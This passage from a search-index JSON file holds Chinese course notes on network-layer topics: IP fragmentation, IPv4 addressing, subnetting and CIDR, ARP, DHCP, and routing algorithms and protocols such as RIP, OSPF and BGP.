\u6570\u636e\u62a5\u4e2d\u7684\u6570\u636e\u5206\u88c5\u5728\u591a\u4e2a\u8f83\u5c0f\u7684 IP \u6570\u636e\u62a5\u4e2d\uff0c\u5373\u5206\u7247\u3002</p> <p>\u4f8b\u5982\uff0c\u4e00\u4e2a 4000B \u7684 IP \u6570\u636e\u62a5\uff0820B \u9996\u90e8\uff0c3980B \u6570\u636e\uff09\u9700\u8981\u8f6c\u53d1\u5230\u4e00\u6761 MTU \u4e3a 1500B \u7684\u94fe\u8def\u4e0a\u3002\u90a3\u4e48\u7ecf\u8ba1\u7b97\uff0c\u539f\u59cb\u6570\u636e\u62a5\u4e2d 3980B \u6570\u636e\u88ab\u5206\u4e3a\u4e09\u7247\uff0c\u6bcf\u7247\u6570\u636e\u90e8\u5206\u4f9d\u6b21\u4e3a 1480B\u30011480B\u30011020B\uff0c\u5b83\u4eec\u7684\u6807\u8bc6\u53f7\u5747\u4e0e\u539f\u59cb\u6570\u636e\u62a5\u76f8\u540c\uff1a</p> <p></p>"},{"location":"Courses/CN/Topic3/#ipv4_1","title":"IPv4 \u5730\u5740","text":"<p>IP \u5730\u5740\u662f\u7f51\u7edc\u4e0a\u6bcf\u53f0\u4e3b\u673a\u6216\u8def\u7531\u5668\u7684\u6bcf\u4e00\u4e2a\u63a5\u53e3\u90fd\u4f1a\u88ab\u5206\u914d\u7684\u4e00\u4e2a\u5168\u7403\u552f\u4e00 32 \u4f4d\u6807\u8bc6\u7b26\uff0c\u5b83\u7531\u7f51\u7edc\u53f7\u548c\u4e3b\u673a\u53f7\u7ec4\u6210\uff0c\u5176\u4e2d\u7f51\u7edc\u53f7\u6807\u5fd7\u8be5\u4e3b\u673a\u6240\u8fde\u63a5\u5230\u7684\u7f51\u7edc\uff0c\u4e3b\u673a\u53f7\u6807\u5fd7\u8be5\u4e3b\u673a\u3002</p> <p>\u65e9\u671f\u4e92\u8fde\u7f51\u4f7f\u7528\u5206\u7c7b\u7684 IP \u5730\u5740\uff1a</p> <p></p> \u5224\u65ad\u4ee5\u4e0b\u5730\u5740\u7c7b\u578b <ul> <li><code>10.2.1.1</code> A \u7c7b</li> <li><code>128.63.2.100</code> B \u7c7b</li> <li><code>201.222.5.64</code> C \u7c7b</li> <li><code>256.241.201.10</code> \u4e0d\u5b58\u5728\uff0c\u8d85\u51fa\u8303\u56f4</li> </ul> \u7f51\u7edc\u7c7b\u522b \u7b2c\u4e00\u4e2a\u53ef\u7528\u7f51\u7edc\u53f7 \u6700\u540e\u4e00\u4e2a\u53ef\u7528\u7f51\u7edc\u53f7 \u6700\u5927\u53ef\u7528\u7f51\u7edc\u6570 \u6bcf\u4e2a\u7f51\u7edc\u4e2d\u6700\u5927\u4e3b\u673a\u6570 A 1 126 \\(2^7-2\\) \\(2^{24}-2\\) B 128.0 191.255 \\(2^{14}\\) \\(2^{16}-2\\) C 192.0.0 223.255.255 \\(2^{21}\\) \\(2^8-2\\) <p>\u5bf9\u4e8e A \u7c7b\u7f51\u7edc\uff0c\u7f51\u7edc\u53f7 0 \u548c 127 \u88ab\u7279\u6b8a\u5730\u5740\u5360\u7528\uff0c\u6240\u4ee5\u6700\u5927\u53ef\u7528\u7f51\u7edc\u4e3a \\(2^7-2\\)</p> <p>\u5728\u5404\u7c7b IP \u5730\u5740\u4e2d\uff0c\u6709\u4e9b IP \u5730\u5740\u5177\u6709\u7279\u6b8a\u7528\u9014\uff0c\u4e0d\u7528\u505a\u4e3b\u673a\u7684 IP \u5730\u5740\uff1a</p> \u5730\u5740 \u7528\u9014 \u5168 0 \u7f51\u7edc\u5730\u5740 \u53ea\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\u6709\u6548\uff0c\u7528\u4e8e\u542f\u52a8\u65f6\u4e34\u65f6\u901a\u4fe1\uff0c\u53c8\u53eb\u4e3b\u673a\u5730\u5740 127.x.x.x \u6307\u672c\u5730\u8282\u70b9\uff0c\u7528\u4e8e\u6d4b\u8bd5\u7f51\u5361\u53ca TCP/IP \u8f6f\u4ef6 \u5168 0 \u4e3b\u673a\u5730\u5740 \u6307\u7f51\u7edc\u672c\u8eab \u5168 1 \u4e3b\u673a\u5730\u5740 \u6307\u672c\u7f51\u7edc\u7684\u5e7f\u64ad\u5730\u5740\uff0c\u4e5f\u79f0\u76f4\u63a5\u5e7f\u64ad\u5730\u5740 0.0.0.0 \u6307\u4efb\u610f\u5730\u5740 255.255.255.255 \u7528\u4e8e\u672c\u5730\u5e7f\u64ad\uff0c\u4e5f\u79f0\u53d7\u9650\u5e7f\u64ad\u5730\u5740"},{"location":"Courses/CN/Topic3/#_6","title":"\u5b50\u7f51\u5212\u5206","text":"<p>\u7f51\u7edc\u53f7\uff1a\u4e3b\u673a\u53f7\u8fd9\u79cd\u4e24\u7ea7 IP \u5730\u5740\u7684\u7f3a\u70b9\u5728\u4e8e\u4e0d\u591f\u7075\u6d3b\uff0c\u6709\u65f6\u4f1a\u5bfc\u81f4 IP \u5730\u5740\u7a7a\u95f4\u5229\u7528\u7387\u592a\u4f4e\u3002</p> <p>1985 \u5e74\u4ee5\u540e\uff0cIP \u5730\u5740\u4e2d\u65b0\u589e\u5b57\u6bb5\u5b50\u7f51\u53f7\uff0c\u4f7f\u5f97\u4e24\u7ea7 IP \u5730\u5740\u53d8\u4e3a\u4e09\u7ea7 IP \u5730\u5740\u3002\u5b50\u7f51\u5212\u5206 subnetting \u5728\u7f51\u7edc\u5185\u90e8\u5c06\u4e00\u4e2a\u7f51\u7edc\u5757\u8fdb\u884c\u5212\u5206\u4ee5\u4f9b\u591a\u4e2a\u5185\u90e8\u7f51\u7edc\u4f7f\u7528\uff0c\u5bf9\u5916\u4ecd\u662f\u4e00\u4e2a\u7f51\u7edc\u3002</p> <p>\u6211\u4eec\u7528\u5b50\u7f51\u63a9\u7801\u6765\u6307\u660e\u5206\u7c7b IP \u5730\u5740\u7684\u4e3b\u673a\u53f7\u90e8\u5206\u88ab\u501f\u7528\u4e86\u591a\u5c11\u4f4d\u4f5c\u4e3a\u5b50\u7f51\u53f7\u3002\u5b50\u7f51\u63a9\u7801\u4e3a \\(1^* 0^*\\) \u7ec4\u6210\uff0c\u4e3b\u673a\u6216\u8def\u7531\u5668\u53ea\u9700\u5c06 IP \u5730\u5740\u4e0e\u5bf9\u5e94\u5b50\u7f51\u63a9\u7801\u9010\u4f4d\u4e0e\u8fd0\u7b97\u5373\u53ef\u5f97\u5230\u76f8\u5e94\u5b50\u7f51\u7684\u7f51\u7edc\u5730\u5740\u3002</p> <p></p> <p>\u65e0\u5206\u7c7b\u7f16\u5740 Classless Inter-Domain Routing \u5728\u53d8\u957f\u5b50\u7f51\u63a9\u7801\u7684\u57fa\u7840\u4e0a\uff0c\u8fdb\u4e00\u6b65\u6d88\u9664\u4e86\u4f20\u7edf A\u3001B\u3001C \u7c7b\u5730\u5740\u7684\u6982\u5ff5\u3002\u5b83\u4f7f\u7528\u957f\u5ea6\u53ef\u4efb\u610f\u9009\u53d6\u7684\u7f51\u7edc\u524d\u7f00\u6765\u4ee3\u66ff\u7f51\u7edc\u53f7\uff0c\u56e0\u6b64\u5206\u914d\u66f4\u7075\u6d3b\u6709\u6548\u3002</p> <p>CIDR \u901a\u5e38\u4f7f\u7528\u659c\u7ebf\u8bb0\u6cd5\uff0c\u4f8b\u5982\u5bf9\u4e8e\u5730\u5740 <code>128.14.32.5/20</code>\uff0c\u5b83\u7684\u63a9\u7801\u662f 20 \u4e2a\u8fde\u7eed\u7684 1 \u548c\u540e\u7eed 12 \u4e2a\u8fde\u7eed\u7684 0\uff0c\u901a\u8fc7\u9010\u4f4d\u4e0e\u5373\u53ef\u5f97\u5230\u8be5\u5730\u5740\u7684\u7f51\u7edc\u524d\u7f00\uff1a</p> <p></p>"},{"location":"Courses/CN/Topic3/#_7","title":"\u5206\u7ec4\u8f6c\u53d1","text":"<p>\u8def\u7531\u5668\u8f6c\u53d1\u8868\u4e2d\u4e00\u5b9a\u5305\u542b\u76ee\u7684\u7f51\u7edc\u5730\u5740\u548c\u4e0b\u4e00\u8df3\u5730\u5740\u4e24\u4e2a\u5b57\u6bb5\uff0cIP \u6570\u636e\u62a5\u53ef\u4ee5\u901a\u8fc7\u591a\u6b21\u95f4\u63a5\u4ea4\u4ed8\u5230\u8fbe\u76ee\u7684\u4e3b\u673a\u6240\u5728\u7f51\u7edc\u7684\u8def\u7531\u5668\uff0c\u7136\u540e\u5bf9\u4e3b\u673a\u8fdb\u884c\u76f4\u63a5\u4ea4\u4ed8\u3002</p> <p>\u5982\u679c\u91c7\u7528 CIDR \u7f16\u5740\uff0c\u4e00\u4e2a\u5206\u7ec4\u53ef\u80fd\u5728\u8f6c\u53d1\u8868\u4e2d\u627e\u5230\u591a\u4e2a\u5339\u914d\u7684\u524d\u7f00\uff0c\u6b64\u65f6\u5e94\u8be5\u6309\u7167\u6700\u957f\u524d\u7f00\u5339\u914d Longest Prefix Match \u539f\u5219\u9009\u62e9\u6700\u5177\u4f53\u7684\u8def\u7531\u3002</p> <p>\u4f8b\u5982\uff1a\u76ee\u6807\u5730\u5740\u662f\u00a0<code>192.168.1.25</code>\u00a0\u8def\u7531\u8868\u4e2d\u6709\uff1a</p> <ul> <li><code>192.168.1.0/24</code>\u00a0\u2192 eth0</li> <li><code>192.168.0.0/16</code>\u00a0\u2192 eth1</li> </ul> <p>\u7cfb\u7edf\u4f1a\u9009\u62e9\u66f4\u201c\u5177\u4f53\u201d\u7684\u00a0<code>/24</code>\u00a0\u8def\u7531\u3002</p> <p>\u6b64\u5916\uff0c\u8def\u7531\u8868\u4e2d\u8fd8\u53ef\u4ee5\u589e\u52a0\u4e24\u79cd\u7279\u6b8a\u7684\u8def\u7531\uff1a</p> <ul> <li>&lt;1&gt; \u7279\u5b9a\u4e3b\u673a\u8def\u7531 \u5bf9\u7279\u5b9a\u76ee\u7684\u4e3b\u673a\u7684 IP \u5730\u5740\u6307\u5b9a\u4e00\u4e2a\u8def\u7531\uff0c\u4ee5\u65b9\u4fbf\u7ba1\u7406\u5458\u63a7\u5236\u4e0e\u6d4b\u8bd5\u7f51\u7edc<ul> <li>\u82e5\u7279\u5b9a\u4e3b\u673a IP \u4e3a a.b.c.d\uff0c\u5219\u8f6c\u53d1\u8868\u4e2d\u5bf9\u5e94\u9879\u76ee\u7684\u7f51\u7edc\u5730\u5740\u4e3a a.b.c.d/32\uff0c\u5176\u4e2d /32 \u8868\u793a\u7684\u5b50\u7f51\u63a9\u7801\u6ca1\u6709\u610f\u4e49</li> </ul> </li> <li>&lt;2&gt; \u9ed8\u8ba4\u8def\u7531 \u7528\u7279\u6b8a\u524d\u7f00 0.0.0.0/0 \u8868\u793a\u9ed8\u8ba4\u8def\u7531\uff0c\u6240\u6709\u4e0d\u5728\u8f6c\u53d1\u8868\u4e2d\u7684\u76ee\u7684\u7f51\u7edc\u5747\u8d70\u9ed8\u8ba4\u8def\u7531<ul> <li>\u9ed8\u8ba4\u8def\u7531\u901a\u5e38\u7528\u4e8e\u8def\u7531\u5668\u5230\u4e92\u8054\u7f51\u7684\u8def\u7531</li> </ul> </li> </ul>"},{"location":"Courses/CN/Topic3/#_8","title":"\u5730\u5740\u89e3\u6790","text":"<p>\u5728\u5b9e\u9645\u7f51\u7edc\u94fe\u8def\u4f20\u9001\u6570\u636e\u5e27\u65f6\uff0c\u6700\u7ec8\u5fc5\u987b\u4f7f\u7528 MAC \u5730\u5740\uff0c\u6240\u4ee5\u9700\u8981\u4e00\u79cd\u65b9\u6cd5\u5b8c\u6210 IP \u5730\u5740\u5230 MAC \u5730\u5740\u7684\u6620\u5c04\uff0c\u5373 Address Resolution Protocol\u3002</p> <p>\u6bcf\u53f0\u4e3b\u673a\u90fd\u6709\u4e00\u4e2a ARP \u7f13\u5b58\uff0c\u7528\u4e8e\u5b58\u653e\u672c\u5c40\u57df\u7f51\u4e0a\u5404\u4e3b\u673a\u548c\u8def\u7531\u5668\u7684 IP \u5730\u5740\u5230 MAC \u5730\u5740\u7684\u6620\u5c04\u8868\uff0c\u79f0 ARP \u8868\u3002</p> <p>ARP \u4e2d\u6bcf\u4e2a\u8868\u9879\u90fd\u6709\u4e00\u5b9a\u751f\u5b58\u65f6\u95f4\uff0c\u8d85\u65f6\u5219\u4f1a\u88ab\u5220\u9664</p> <p>\u5f53\u4e3b\u673a A \u8981\u5411\u672c\u5c40\u57df\u7f51\u4e0a\u7684\u67d0\u4e2a\u4e3b\u673a B \u53d1\u9001 IP \u6570\u636e\u62a5\u65f6\uff0c\u5c31\u5148\u5728\u5176 ARP \u8868\u4e2d\u67e5\u627e\u6709\u65e0\u4e3b\u673a B \u7684 IP \u5730\u5740\u3002</p> <ul> <li>\u5982\u679c\u6709\uff0c\u5c31\u5728 ARP \u8868\u4e2d\u67e5\u51fa\u5176\u5bf9\u5e94\u7684\u786c\u4ef6\u5730\u5740\uff0c\u518d\u628a\u5176\u786c\u4ef6\u5730\u5740\u5199\u5165\u5230 MAC \u5e27\uff0c\u7136\u540e\u901a\u8fc7\u5c40\u57df\u7f51\u628a\u8be5 MAC \u5e27\u53d1\u5f80\u6b64\u786c\u4ef6\u5730\u5740\u3002</li> <li>\u5982\u679c\u6ca1\u6709\uff0c\u5219\u5728\u672c\u5c40\u57df\u7f51\u4e0a\u5e7f\u64ad\u53d1\u9001\u4e00\u4e2a ARP \u8bf7\u6c42\u5206\u7ec4\uff0c\u5e7f\u64ad\u4f7f\u7528\u7684\u76ee\u7684 MAC \u5730\u5740\u4e3a FF-FF-FF-FF-FF-FF\u3002\u4e3b\u673a B \u5728 ARP \u5206\u7ec4\u4e2d\u89c1\u5230\u81ea\u5df1\u7684 IP \u5730\u5740\u5c31\u5411 A \u53d1\u9001ARP\u54cd\u5e94\u5206\u7ec4\uff08\u5355\u64ad\uff09\u3002\u4e3b\u673a A \u6536\u5230\u4e3b\u673a B \u7684ARP\u54cd\u5e94\u5206\u7ec4\u540e\uff0c\u5c31\u5728\u5176 ARP \u7f13\u5b58\u8868\u4e2d\u5199\u5165\u4e3b\u673a B \u7684 IP \u5730\u5740\u5230\u786c\u4ef6\u5730\u5740\u7684\u6620\u5c04\u3002</li> </ul> <p>ARP \u534f\u8bae\u89e3\u6790\u662f\u81ea\u52a8\u8fdb\u884c\u7684\uff0c\u7528\u6237\u5e76\u4e0d\u77e5\u9053\u5730\u5740\u89e3\u6790\u7684\u8fc7\u7a0b\u3002</p>"},{"location":"Courses/CN/Topic3/#dhcp","title":"DHCP","text":"<p>Dynamic Host Configuration Protocol \u7528\u4e8e\u7ed9\u4e3b\u673a\u52a8\u6001\u5206\u914d IP \u5730\u5740\uff0c\u5b83\u63d0\u4f9b\u4e86\u5373\u63d2\u5373\u7528\u7684\u8054\u7f51\u673a\u5236\uff0c\u5141\u8bb8\u4e00\u53f0\u8ba1\u7b97\u673a\u52a0\u5165\u65b0\u7684\u7f51\u7edc\u81ea\u52a8\u83b7\u53d6 IP \u5730\u5740\u3002</p> <p>DHCP \u662f\u57fa\u4e8e UDP \u7684\u5e94\u7528\u5c42\u534f\u8bae</p> <p>\u4e3b\u673a\u5411 DHCP \u670d\u52a1\u5668\u5e7f\u64ad\u53d1\u73b0\u62a5\u6587\uff0c\u672c\u5730\u7f51\u7edc\u4e0a\u7684\u6240\u6709\u4e3b\u673a\u867d\u7136\u90fd\u80fd\u6536\u5230\u8be5\u5e7f\u64ad\u62a5\u6587\uff0c\u4f46\u662f\u53ea\u6709 DHCP \u670d\u52a1\u5668\u624d\u80fd\u56de\u7b54\u3002DHCP \u670d\u52a1\u5668\u73b0\u5728\u6570\u636e\u5e93\u4e2d\u67e5\u627e\u8be5\u8ba1\u7b97\u673a\u7684\u914d\u7f6e\u4fe1\u606f\uff0c\u5982\u679c\u627e\u4e0d\u5230\uff0c\u5219\u4ece\u670d\u52a1\u5668\u7684 IP \u5730\u5740\u6c60\u4e2d\u83b7\u53d6\u4e00\u4e2a\u5730\u5740\u5206\u914d\u7ed9\u8be5\u4e3b\u673a\uff0c\u5e76\u56de\u590d\u63d0\u4f9b\u62a5\u6587\u3002</p> <p>\u5b8c\u6574\u7684\u4ea4\u6362\u8fc7\u7a0b\u5982\u4e0b\uff1a</p> <p></p> <p>\u56e0\u4e3a\u542f\u52a8\u65f6\u5ba2\u6237\u673a\u5e76\u4e0d\u77e5\u9053\u670d\u52a1\u5668\u7684 IP \u5730\u5740\uff0c\u6240\u4ee5\u4e0d\u80fd\u5efa\u7acb TCP \u8fde\u63a5\uff0c\u56e0\u6b64\u91c7\u7528 UDP \u5e7f\u64ad\u7684\u65b9\u5f0f\u3002</p>"},{"location":"Courses/CN/Topic3/#icmp","title":"ICMP","text":""},{"location":"Courses/CN/Topic3/#_9","title":"\u8def\u7531\u7b97\u6cd5\u548c\u8def\u7531\u534f\u8bae","text":""},{"location":"Courses/CN/Topic3/#_10","title":"\u8def\u7531\u7b97\u6cd5","text":"<p>\u8def\u7531\u7b97\u6cd5\u662f\u8def\u7531\u9009\u62e9\u534f\u8bae\u7684\u6838\u5fc3\uff0c\u51b3\u5b9a\u4e86\u8def\u7531\u8868\u7684\u8868\u9879\u662f\u5982\u4f55\u83b7\u5f97\u7684\u3002\u7ed9\u5b9a\u4e00\u7ec4\u8def\u7531\u5668\u53ca\u8fde\u63a5\u8def\u7531\u5668\u7684\u94fe\u8def\uff0c\u8def\u7531\u7b97\u6cd5\u8981\u627e\u5230\u4e00\u6761\u4ece\u6e90\u8def\u7531\u5668\u5230\u76ee\u7684\u8def\u7531\u5668\u7684\u6700\u4f73\u8def\u5f84\u3002</p> <p>\u8fd9\u91cc\u7684\u201c\u6700\u4f73\u201d\u6307\u5177\u6709\u6700\u4f4e\u7684\u5f00\u9500</p> <p>\u6839\u636e\u80fd\u5426\u968f\u7f51\u7edc\u7684\u901a\u4fe1\u91cf\u6216\u62d3\u6251\u81ea\u9002\u5e94\u5730\u8c03\u6574\u53d8\u5316\uff0c\u8def\u7531\u7b97\u6cd5\u88ab\u5212\u5206\u4e3a\u5982\u4e0b\u4e24\u5927\u7c7b\uff1a</p> <ul> <li>&lt;1&gt; \u9759\u6001\u8def\u7531\u7b97\u6cd5 \u6307\u7531\u7f51\u7edc\u7ba1\u7406\u5458\u624b\u5de5\u914d\u7f6e\u6bcf\u4e00\u6761\u8def\u7531<ul> <li>\u7b80\u5355\u3001\u5f00\u9500\u8f83\u5c0f\uff0c\u4f46\u4e0d\u80fd\u53ca\u65f6\u9002\u5e94\u7f51\u7edc\u72b6\u6001\u53d8\u5316</li> <li>\u9002\u7528\u4e8e\u7b80\u5355\u7684\u5c0f\u578b\u7f51\u7edc</li> </ul> </li> <li>&lt;2&gt; \u52a8\u6001\u8def\u7531\u7b97\u6cd5 \u6839\u636e\u7f51\u7edc\u6d41\u91cf\u8d1f\u8f7d\u548c\u62d3\u6251\u7ed3\u6784\u7684\u53d8\u5316\u6765\u52a8\u6001\u8c03\u6574\u81ea\u8eab\u7684\u8def\u7531\u8868<ul> <li>\u5e38\u7528\u7684\u52a8\u6001\u8def\u7531\u7b97\u6cd5\u5206\u4e3a\u8ddd\u79bb-\u5411\u91cf\u8def\u7531\u7b97\u6cd5\u548c\u94fe\u8def\u72b6\u6001\u8def\u7531\u7b97\u6cd5</li> </ul> </li> </ul> <p>Distance Vector Routing</p> <p>\u6240\u6709\u6700\u77ed\u8def\u5f84\u7b97\u6cd5\u90fd\u4f9d\u8d56\u4e8e\u4e00\u4e2a\u6027\u8d28\uff1a\u4e24\u70b9\u4e4b\u95f4\u7684\u6700\u77ed\u8def\u5f84\u4e5f\u5305\u542b\u4e86\u5176\u5b83\u9876\u70b9\u4e4b\u95f4\u7684\u6700\u77ed\u8def\u5f84\u3002\u8ddd\u79bb-\u5411\u91cf\u8def\u7531\u7b97\u6cd5\u4f7f\u7528 Bellman-Ford \u7b97\u6cd5\u4f5c\u4e3a\u57fa\u7840\uff0c\u5bf9\u7f51\u7edc\u4e0a\u6bcf\u4e2a\u8282\u70b9 \\(x\\) \u7ef4\u62a4\u4ee5\u4e0b\u8def\u7531\u4fe1\u606f\uff1a</p> <ul> <li>&lt;1&gt; \u4ece \\(x\\) \u5230\u6bcf\u4e2a\u76f4\u63a5\u76f8\u8fde\u90bb\u5c45 \\(v\\) \u7684\u94fe\u8def\u8d39\u7528 \\(c(x,v)\\)</li> <li>&lt;2&gt; \u8282\u70b9 \\(x\\) \u7684\u8ddd\u79bb\u5411\u91cf\uff0c\u5373 \\(x\\) \u5230\u7f51\u7edc\u4e2d\u5176\u5b83\u8282\u70b9\u7684\u5f00\u9500<ul> <li>\u8fd9\u662f\u4e00\u7ec4\u8ddd\u79bb\uff0c\u56e0\u6b64\u79f0\u4e3a\u8ddd\u79bb\u5411\u91cf</li> </ul> </li> <li>&lt;3&gt; \\(x\\) \u7684\u6bcf\u4e2a\u90bb\u5c45\u7684\u8ddd\u79bb\u5411\u91cf</li> </ul> <p>Bellman-Ford \u7b97\u6cd5\u7528\u4e8e\u8ba1\u7b97\u5355\u6e90\u6700\u77ed\u8def\u5f84\uff0c\\(d_x(y)\\) \u8868\u793a\u70b9 \\(x\\) \u5230 \\(y\\) \u7684\u6700\u77ed\u8ddd\u79bb</p> <p>\u5728\u8ddd\u79bb-\u5411\u91cf\u7b97\u6cd5\u4e2d\uff0c\u6bcf\u4e2a\u8282\u70b9\u5b9a\u671f\u5411\u5b83\u7684\u6bcf\u4e2a\u90bb\u5c45\u53d1\u9001\u81ea\u5df1\u7684\u8ddd\u79bb\u5411\u91cf\u526f\u672c\u3002\u5f53\u8282\u70b9 \\(x\\) \u4ece\u90bb\u5c45 \\(v\\) \u6536\u5230\u4e86\u4e00\u4e2a\u65b0\u8ddd\u79bb\u5411\u91cf\u65f6\uff0c\u5b83\u4f1a\u4f7f\u7528 Bellman-Ford \u516c\u5f0f \\(d_x(y) = \\min \\{c(x,y) + d_v(y)\\}\\) \u6765\u66f4\u65b0\u81ea\u5df1\u7684\u8ddd\u79bb\u5411\u91cf\u3002\u5982\u679c \\(x\\) \u7684\u8ddd\u79bb\u5411\u91cf\u56e0\u6b64\u800c\u6539\u53d8\uff0c\u5219\u5b83\u63a5\u4e0b\u6765\u7ee7\u7eed\u5411\u5b83\u7684\u6bcf\u4e2a\u90bb\u5c45\u53d1\u9001\u66f4\u65b0\u540e\u7684\u8ddd\u79bb\u5411\u91cf\u3002</p> <p>\u663e\u7136\uff0c\u7528\u4e8e\u66f4\u65b0\u8def\u7531\u7684\u66f4\u65b0\u62a5\u6587\u5927\u5c0f\u4e0e\u7f51\u7edc\u4e2d\u8282\u70b9\u6570\u91cf\u6210\u6b63\u6bd4\uff0c\u56e0\u6b64\u5927\u578b\u7f51\u7edc\u5c06\u5bfc\u81f4\u5f88\u5927\u7684\u66f4\u65b0\u62a5\u6587\uff0c\u5e76\u4e14 Bellman-Ford \u7b97\u6cd5\u65f6\u95f4\u590d\u6742\u5ea6\u53ef\u8fbe \\(O(N\\times E)\\approx O(N^3)\\)\u3002</p> <p>\u8ddd\u79bb\u5411\u91cf\u7b97\u6cd5\u7684\u7279\u70b9\u662f\u8fed\u4ee3\u3001\u5206\u5e03\u5f0f</p> <ul> <li>\u6bcf\u6b21\u672c\u5730\u8fed\u4ee3\u7531\u4e0b\u5217\u5f15\u8d77\uff1a\u672c\u5730\u94fe\u8def\u8d39\u7528\u6539\u53d8\u3001\u90bb\u5c45\u66f4\u65b0\u62a5\u6587</li> <li>\u5404\u8282\u70b9\u4f9d\u6b21\u8ba1\u7b97\uff0c\u76f8\u4e92\u4f9d\u8d56</li> </ul> <p>Link State Routing</p> <p>\u6211\u4eec\u5c06\u672c\u8def\u7531\u5668\u90fd\u548c\u54ea\u4e9b\u8def\u7531\u5668\u76f8\u90bb\uff08\u7f51\u7edc\u62d3\u6251\uff09\u4ee5\u53ca\u76f8\u5e94\u94fe\u8def\u7684\u4ee3\u4ef7\u79f0\u4e3a\u94fe\u8def\u72b6\u6001\u3002\u94fe\u8def\u72b6\u6001\u7b97\u6cd5\u4f1a\u7ef4\u62a4\u4e00\u4e2a\u5168\u7f51\u8303\u56f4\u5185\u4e00\u81f4\u7684\u62d3\u6251\u7ed3\u6784\u56fe\uff0c\u6bcf\u4e2a\u8282\u70b9\u4f1a\u6267\u884c\u4e0b\u5217\u4e24\u9879\u4efb\u52a1\uff1a</p> <ul> <li>\u4e3b\u52a8\u6d4b\u8bd5\u6240\u6709\u76f8\u90bb\u8282\u70b9\u7684\u72b6\u6001</li> <li>\u5b9a\u671f\u5c06\u94fe\u8def\u72b6\u6001\u4f20\u64ad\u7ed9\u6240\u6709\u5176\u5b83\u8282\u70b9<ul> <li>\u56e0\u6b64\u6bcf\u4e2a\u8282\u70b9\u90fd\u76f4\u5230\u5168\u7f51\u5171\u6709\u591a\u5c11\u4e2a\u8282\u70b9\u3001\u90a3\u4e9b\u8282\u70b9\u662f\u76f8\u8fde\u7684\u3001\u5176\u4ee3\u4ef7\u662f\u591a\u5c11</li> <li>\u6bcf\u4e2a\u8282\u70b9\u90fd\u53ef\u6839\u636e\u5168\u5c40\u94fe\u8def\u72b6\u6001\u901a\u8fc7 Dijkstra \u7b97\u6cd5\u8ba1\u7b97\u51fa\u5230\u8fbe\u5176\u5b83\u8282\u70b9\u7684\u6700\u77ed\u8def\u5f84</li> </ul> </li> </ul> <p>\u5728\u94fe\u8def\u72b6\u6001\u7b97\u6cd5\u4e2d\uff0c\u867d\u7136\u6bcf\u4e2a\u8282\u70b9\u9700\u8981\u5b58\u50a8\u66f4\u591a\u6570\u636e\uff08\u7f51\u7edc\u62d3\u6251\u7ed3\u6784\u56fe\uff09\uff0c\u4f46\u662f\u5b83\u4eec\u53ea\u9700\u8981\u901a\u8fc7\u5e7f\u64ad\u7684\u65b9\u5f0f\u544a\u8bc9\u5176\u5b83\u6240\u6709\u8282\u70b9\u5b83\u4e0e\u5b83\u76f4\u63a5\u76f8\u90bb\u7684\u94fe\u8def\u7684\u4ee3\u4ef7\uff0c\u62a5\u6587\u5927\u5c0f\u4e0e\u7f51\u7edc\u4e2d\u8282\u70b9\u6570\u91cf\u65e0\u5173\u3002</p>"},{"location":"Courses/CN/Topic3/#_11","title":"\u8def\u7531\u534f\u8bae","text":"<p>\u4e92\u8054\u7f51\u88ab\u5212\u5206\u4e3a\u8bb8\u591a\u8f83\u5c0f\u7684\u81ea\u6cbb\u7cfb\u7edf Autonomous System AS\u3002\u81ea\u6cbb\u7cfb\u7edf\u662f\u5728\u5355\u4e00\u6280\u672f\u7ba1\u7406\u4e0b\u7684\u4e00\u7ec4\u8def\u7531\u5668\uff0c\u8fd9\u4e9b\u8def\u7531\u5668\u4f7f\u7528\u4e00\u79cd AS \u5185\u90e8\u7684\u8def\u7531\u9009\u62e9\u534f\u8bae\u548c\u5171\u540c\u7684\u5ea6\u91cf\u3002</p> <ul> <li>Interior Gateway Protocol, IGP \u662f\u5728\u4e00\u4e2a\u81ea\u6cbb\u7cfb\u7edf\u5185\u90e8\u4f7f\u7528\u7684\u8def\u7531\u9009\u62e9\u534f\u8bae\uff0c\u5b83\u4e0e\u4e92\u8054\u7f51\u4e2d\u5176\u5b83 AS \u9009\u7528\u4ec0\u4e48\u8def\u7531\u9009\u62e9\u534f\u8bae\u65e0\u5173\uff0c\u5305\u62ec\u6211\u4eec\u4e0a\u9762\u6240\u8bf4\u7684\u4e24\u79cd\u8def\u7531\u7b97\u6cd5</li> <li>External Gateway Protocol, EGP \u7528\u6765\u4f20\u9012\u4e0d\u540c\u81ea\u6cbb\u7cfb\u7edf\u4e2d\u7684\u8def\u7531\u9009\u62e9\u4fe1\u606f\uff0c\u4f8b\u5982\u6e90\u4e3b\u673a\u548c\u76ee\u7684\u4e3b\u673a\u4e0d\u5728\u540c\u4e00 AS \u4e2d\uff0c\u5c31\u9700\u8981\u7528\u5230 EGP</li> </ul> <p>\u81ea\u6cbb\u7cfb\u7edf\u4e4b\u95f4\u7684\u8def\u7531\u9009\u62e9\u79f0\u4e3a\u57df\u95f4\u8def\u7531\u9009\u62e9\uff0c\u81ea\u6cbb\u7cfb\u7edf\u5185\u90e8\u7684\u8def\u7531\u9009\u62e9\u79f0\u4e3a\u57df\u5185\u8def\u7531\u9009\u62e9</p> \u534f\u8bae RIP OSPF BGP \u7c7b\u578b IGP IGP EGP \u8def\u7531\u7b97\u6cd5 \u8ddd\u79bb\u5411\u91cf \u94fe\u8def\u72b6\u6001 \u8def\u5f84\u5411\u91cf \u4f20\u9012\u534f\u8bae UDP IP TCP \u8def\u5f84\u9009\u62e9 \u8df3\u6570\u6700\u5c11 \u4ee3\u4ef7\u6700\u4f4e \u8f83\u597d\uff0c\u975e\u6700\u4f73 \u4ea4\u6362\u8282\u70b9 \u548c\u672c\u8282\u70b9\u76f8\u90bb\u7684\u8def\u7531\u5668 \u7f51\u7edc\u4e2d\u6240\u6709\u8def\u7531\u5668 \u548c\u672c\u8282\u70b9\u76f8\u90bb\u7684\u8def\u7531\u5668 \u4ea4\u6362\u5185\u5bb9 \u5f53\u524d\u672c\u8def\u7531\u5668\u77e5\u9053\u7684\u5168\u90e8\u4fe1\u606f\uff0c\u5373\u81ea\u5df1\u7684\u8def\u7531\u8868 \u4e0e\u672c\u8def\u7531\u5668\u76f8\u90bb\u7684\u6240\u6709\u8def\u7531\u5668\u7684\u94fe\u8def\u72b6\u6001 \u9996\u6b21\u4e3a\u6574\u4e2a\u8def\u7531\u8868\uff0c\u4ee5\u540e\u4e3a\u6709\u53d8\u5316\u7684\u90e8\u5206 <p>Routing Information Protocol, RIP</p> <p>\u8def\u7531\u4fe1\u606f\u534f\u8bae\u662f IGP 